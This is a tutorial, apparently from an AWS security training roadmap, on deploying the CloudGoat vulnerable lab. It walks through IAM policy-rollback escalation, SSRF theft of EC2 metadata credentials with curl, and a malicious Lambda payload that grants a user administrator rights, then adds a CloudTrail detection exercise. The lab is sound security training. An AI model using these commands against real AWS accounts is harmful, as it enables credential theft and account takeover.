# 🐐 CloudGoat — Vulnerable AWS Lab Setup

> **Phase 4 · Document 22 of 29**  
> **Estimated cost:** ~$5–10 per scenario · **Estimated time:** 60–90 minutes  
> **Prerequisites:** All Phase 1–3 documents complete  
> ⚠️ **ONLY run against your own dedicated lab account — never production**

---

## What Is CloudGoat?

CloudGoat is Rhino Security Labs' "vulnerable by design" AWS environment. It deploys intentionally misconfigured infrastructure that you attack and exploit — real vulnerabilities in a controlled, legal environment.

```
Your Attack Machine
      │
      ▼
CloudGoat Target Environment (your own AWS account)
      ├── Misconfigured IAM policies
      ├── Overly permissive roles
      ├── Exposed S3 buckets
      ├── Vulnerable EC2 instances
      └── Privilege escalation paths
```

> **Legal and ethical note:** All attacks in this module are against infrastructure you own and control. Never use these techniques against any environment you do not have explicit written authorization to test.

---

## Safety First — Dedicated Attack Account

**Critical:** Use a completely separate AWS account for CloudGoat. Never run it in an account with real resources or data.

```
Account structure for this roadmap:
  Main Account (account A):  your learning account with $200 credits
  Attack Account (account B): free tier account — CloudGoat runs here
```

Create a free account at aws.amazon.com for the attack account. The free tier is sufficient for most CloudGoat scenarios.

---

## Step 1 — Set Up Your Attack Machine

Use your forensic EC2 instance or a local Kali Linux VM as your attack machine.

```bash
# Install required tools on Ubuntu/Kali
sudo apt update
sudo apt install -y python3 python3-pip git terraform awscli jq curl wget

# Install Python dependencies
pip3 install boto3 botocore

# Verify Terraform
terraform version
# Required: >= 0.14

# Verify AWS CLI
aws --version
```

---

## Step 2 — Install CloudGoat

```bash
# Clone CloudGoat
git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat

# Install Python dependencies
pip3 install -r requirements.txt

# Make cloudgoat.py executable
chmod +x cloudgoat.py
```

---

## Step 3 — Configure CloudGoat

```bash
# Configure with your ATTACK account credentials
# Create a dedicated cloudgoat IAM user in your attack account first:
# IAM → Users → cloudgoat-admin → AdministratorAccess → create access keys

aws configure --profile cloudgoat
# AWS Access Key ID: AKIA... (cloudgoat-admin key)
# AWS Secret Access Key: ...
# Default region: us-east-1
# Default output format: json

# Initialize CloudGoat
python3 cloudgoat.py config profile cloudgoat

# Set your IP as the allowed attacker IP (for SSH and web access)
python3 cloudgoat.py config whitelist --auto
```

---

## Step 4 — Run Scenario 1: IAM Privilege Escalation (iam_privesc_by_rollback)

**Difficulty:** Easy  
**Concept:** Use a misconfigured IAM policy to escalate privileges  
**Time:** 30–45 minutes

```bash
# Deploy the scenario
python3 cloudgoat.py create iam_privesc_by_rollback

# CloudGoat outputs starting credentials:
# cloudgoat_output_raynor_access_key_id: AKIAIOSFODNN7EXAMPLE
# cloudgoat_output_raynor_secret_key: ...
```

### Attack walkthrough

Configure the starting credentials:

```bash
aws configure --profile raynor
# Enter the credentials CloudGoat gave you
```

Enumerate what this identity can do:

```bash
# Who am I?
aws sts get-caller-identity --profile raynor

# What policies do I have?
aws iam list-attached-user-policies \
  --user-name raynor \
  --profile raynor

# What does the policy allow?
aws iam get-policy-version \
  --policy-arn <policy-arn> \
  --version-id v1 \
  --profile raynor
```

Discover the privilege escalation path:

```bash
# Can I set a default policy version?
aws iam set-default-policy-version \
  --policy-arn <policy-arn> \
  --version-id v5 \
  --profile raynor

# Check what v5 allows
aws iam get-policy-version \
  --policy-arn <policy-arn> \
  --version-id v5 \
  --profile raynor
```

Escalate and verify:

```bash
# After rollback to a more permissive version, test admin access
aws iam list-users --profile raynor
aws s3 ls --profile raynor

# Find the secret flag
aws s3 ls s3://cg-secret-s3-bucket-xxxxxxxxx --profile raynor
aws s3 cp s3://cg-secret-s3-bucket-xxxxxxxxx/flag.txt - --profile raynor
```

**What you learned:** An overly permissive `iam:SetDefaultPolicyVersion` allows rolling back to a more permissive policy version — a privilege escalation path that is easy to miss in IAM audits.

```bash
# Clean up
python3 cloudgoat.py destroy iam_privesc_by_rollback
```

---

## Step 5 — Run Scenario 2: EC2 SSRF (ec2_ssrf)

**Difficulty:** Medium  
**Concept:** SSRF vulnerability in a web app → metadata service → IAM credentials  
**Time:** 45–60 minutes

```bash
# Deploy
python3 cloudgoat.py create ec2_ssrf
```

CloudGoat gives you a URL to a web application running on EC2.

### Attack walkthrough

```bash
TARGET_URL="http://<ec2-ip>/..."

# Step 1: Find the SSRF vulnerability
# The app takes a URL parameter and fetches it server-side
curl "$TARGET_URL?url=http://google.com"

# Step 2: Point it at the EC2 metadata service
curl "$TARGET_URL?url=http://169.254.169.254/latest/meta-data/"

# Step 3: Get the IAM role name
curl "$TARGET_URL?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Step 4: Steal the temporary IAM credentials
curl "$TARGET_URL?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"
```

You receive:

```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2024-01-15T16:30:00Z"
}
```

Use the stolen credentials:

```bash
# Configure stolen credentials
export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# What can we do?
aws sts get-caller-identity
aws s3 ls
aws lambda list-functions

# Find the flag
aws lambda list-functions | jq '.Functions[].FunctionName'
aws lambda invoke --function-name <function-name> output.txt
cat output.txt
```

**What you learned:** SSRF + IMDSv1 = complete IAM credential theft. This is why `24-imds-attack-and-hardening.md` mandates IMDSv2.

```bash
python3 cloudgoat.py destroy ec2_ssrf
```

---

## Step 6 — Run Scenario 3: Vulnerable Lambda (lambda_privesc)

**Difficulty:** Medium  
**Concept:** Misconfigured Lambda function allows privilege escalation  
**Time:** 45–60 minutes

```bash
python3 cloudgoat.py create lambda_privesc
```

### Attack path

```bash
# Starting credentials: chris (limited IAM user)
aws configure --profile chris

# Enumerate Lambda functions
aws lambda list-functions --profile chris

# Check Lambda execution role
aws lambda get-function \
  --function-name <function-name> \
  --profile chris

# Get the role's attached policies
aws iam list-attached-role-policies \
  --role-name <lambda-role-name> \
  --profile chris

# Can chris update the Lambda code?
# If yes: upload malicious function that adds chris to admins
cat > escalate.py << 'EOF'
import boto3
import json

def lambda_handler(event, context):
    iam = boto3.client('iam')
    iam.attach_user_policy(
        UserName='chris',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return "Escalated"
EOF

zip escalate.zip escalate.py

aws lambda update-function-code \
  --function-name <function-name> \
  --zip-file fileb://escalate.zip \
  --profile chris

# Invoke the function (runs as the privileged Lambda role)
aws lambda invoke \
  --function-name <function-name> \
  output.txt \
  --profile chris

# Now chris has admin access
aws iam list-users --profile chris  # should work now
```

**What you learned:** If a low-privilege user can update Lambda function code AND the Lambda role has high privileges, that user can escalate by uploading malicious code that runs as the privileged role.

---

## Step 7 — Run Scenario 4: Vulnerable Cognito (cloud_breach_s3)

**Difficulty:** Hard  
**Concept:** Unauthenticated Cognito identity → S3 breach  
**Time:** 60–90 minutes

```bash
python3 cloudgoat.py create cloud_breach_s3
```

This scenario simulates a real-world breach:
1. Find an exposed S3 bucket
2. Discover Cognito identity pool credentials
3. Use those credentials to access more data
4. Escalate to admin

> This is a common real-world attack pattern — many web apps expose Cognito identity pool IDs in JavaScript, giving attackers unauthenticated AWS access.

---

## Blue Team Exercise — Detect Your Own Attack

After completing each scenario, switch to detective mode:

```bash
# Pull CloudTrail logs from the attack account
aws cloudtrail lookup-events \
  --start-time $(date -u -d "2 hours ago" +%Y-%m-%dT%H:%M:%SZ) \
  --profile cloudgoat \
  --query 'Events[*].{Time:EventTime,Event:EventName,User:Username}' \
  --output table

# Questions to answer:
# 1. Can you see your own attack in the logs?
# 2. Which events would have triggered GuardDuty?
# 3. At what point would a human analyst have noticed?
# 4. What detection would have caught this earlier?
```

> This blue team exercise is what makes you a complete security professional — not just able to attack, but able to detect and respond.

---

## Available CloudGoat Scenarios Reference

| Scenario | Difficulty | Techniques covered |
|----------|-----------|-------------------|
| `iam_privesc_by_rollback` | Easy | IAM policy versioning |
| `ec2_ssrf` | Medium | SSRF, IMDS, credential theft |
| `lambda_privesc` | Medium | Lambda code injection, role abuse |
| `cloud_breach_s3` | Hard | Cognito, S3, cross-service |
| `ecs_efs_attack` | Hard | ECS, EFS, container escape |
| `rce_web_app` | Medium | RCE, metadata, privilege escalation |
| `cicd_secrets` | Hard | CI/CD pipeline attacks |
| `vulnerable_cognito` | Medium | Cognito misconfiguration |

---

## Cleanup

```bash
# Destroy all CloudGoat scenarios (very important — they cost money while running)
python3 cloudgoat.py destroy all

# Verify no resources remain
aws ec2 describe-instances --profile cloudgoat
aws s3 ls --profile cloudgoat
aws lambda list-functions --profile cloudgoat
aws iam list-users --profile cloudgoat
```

---

## Phase 4 Progress Tracker

- [x] CloudGoat lab setup
- [ ] IAM privilege escalation paths
- [ ] IMDS attack and hardening
- [ ] S3 misconfiguration attacks
- [ ] Pacu framework basics

---

*Phase 4 · AWS Cybersecurity & Digital Forensics Roadmap*
